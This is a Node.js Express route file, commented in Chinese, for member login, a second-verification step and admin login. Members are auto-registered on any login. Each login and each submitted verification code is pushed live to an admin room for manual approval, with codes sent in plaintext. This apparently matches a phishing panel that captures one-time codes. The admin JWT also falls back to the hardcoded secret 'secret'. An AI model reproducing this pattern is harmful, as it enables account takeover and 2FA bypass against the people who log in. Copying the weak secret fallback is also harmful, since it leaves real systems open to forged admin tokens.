const express = require('express');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const router = express.Router();

module.exports = (db, io) => {
  // 会员登录
  router.post('/member/login', async (req, res) => {
    try {
      const { email, password } = req.body;
      const clientIP = req.ip || req.connection.remoteAddress;

      // 检查会员是否存在，不存在则自动注册
      let [members] = await db.execute('SELECT * FROM members WHERE email = ?', [email]);
      let member;

      if (members.length === 0) {
        // 自动注册新会员
        const hashedPassword = await bcrypt.hash(password, 10);
        const [result] = await db.execute(
          'INSERT INTO members (email, password) VALUES (?, ?)',
          [email, hashedPassword]
        );
        member = { id: result.insertId, email, password: hashedPassword };
      } else {
        member = members[0];
        // 验证密码
        const validPassword = await bcrypt.compare(password, member.password);
        if (!validPassword) {
          return res.status(400).json({ error: req.t('invalid_credentials') });
        }
      }

      // 记录登录日志
      const [loginResult] = await db.execute(
        'INSERT INTO login_logs (member_id, ip_address) VALUES (?, ?)',
        [member.id, clientIP]
      );

      // 通知管理员有新的登录请求
      io.to('admin').emit('new-login-request', {
        id: loginResult.insertId,
        member_id: member.id,
        email: member.email,
        ip_address: clientIP,
        login_time: new Date()
      });

      res.json({
        message: req.t('login_pending_approval'),
        loginId: loginResult.insertId,
        memberId: member.id
      });

    } catch (error) {
      console.error('登录错误:', error);
      res.status(500).json({ error: req.t('server_error') });
    }
  });

  // 提交二次验证码
  router.post('/member/verify', async (req, res) => {
    try {
      const { loginId, verificationCode } = req.body;

      // 获取登录记录
      const [loginLogs] = await db.execute(
        'SELECT * FROM login_logs WHERE id = ? AND status = "approved"',
        [loginId]
      );

      if (loginLogs.length === 0) {
        return res.status(400).json({ error: req.t('invalid_login_session') });
      }

      const loginLog = loginLogs[0];

      // 记录二次验证
      const [verifyResult] = await db.execute(
        'INSERT INTO second_verifications (member_id, login_log_id, verification_code) VALUES (?, ?, ?)',
        [loginLog.member_id, loginId, verificationCode]
      );

      // 通知管理员有新的验证请求
      const [members] = await db.execute('SELECT email FROM members WHERE id = ?', [loginLog.member_id]);
      io.to('admin').emit('new-verification-request', {
        id: verifyResult.insertId,
        member_id: loginLog.member_id,
        email: members[0].email,
        verification_code: verificationCode,
        submitted_at: new Date()
      });

      res.json({
        message: req.t('verification_pending_approval'),
        verificationId: verifyResult.insertId
      });

    } catch (error) {
      console.error('验证错误:', error);
      res.status(500).json({ error: req.t('server_error') });
    }
  });

  // 管理员登录
  router.post('/admin/login', async (req, res) => {
    try {
      const { username, password } = req.body;

      const [admins] = await db.execute('SELECT * FROM admins WHERE username = ?', [username]);
      if (admins.length === 0) {
        return res.status(400).json({ error: req.t('invalid_credentials') });
      }

      const admin = admins[0];
      const validPassword = await bcrypt.compare(password, admin.password);
      if (!validPassword) {
        return res.status(400).json({ error: req.t('invalid_credentials') });
      }

      const token = jwt.sign(
        { id: admin.id, username: admin.username, role: 'admin' },
        process.env.JWT_SECRET || 'secret',
        { expiresIn: '24h' }
      );

      res.json({
        token,
        admin: { id: admin.id, username: admin.username }
      });

    } catch (error) {
      console.error('管理员登录错误:', error);
      res.status(500).json({ error: req.t('server_error') });
    }
  });

  return router;
};